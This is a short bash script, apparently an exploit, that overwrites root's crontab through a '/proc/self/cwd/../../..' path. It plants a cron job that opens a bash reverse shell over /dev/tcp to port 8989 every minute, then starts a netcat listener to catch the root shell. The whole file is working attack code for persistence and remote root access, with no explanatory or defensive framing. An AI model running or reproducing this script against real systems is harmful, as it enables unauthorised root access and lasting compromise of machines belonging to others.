#!/bin/bash
ip=$(hostname -I | awk '{print $1}')
port=8989
filename="/proc/self/cwd/../../../../var/spool/cron/crontabs/root"

if [[ -f "$filename" ]]; then
cat > $filename << EOF
#!/bin/bash
* * * * * /bin/bash -c "/bin/bash -i >& /dev/tcp/$ip/$port 0>&1"
EOF
# listen and wait for reverse shell
nc -lvvp $port
else
    echo "cant exploit by crontab."
fi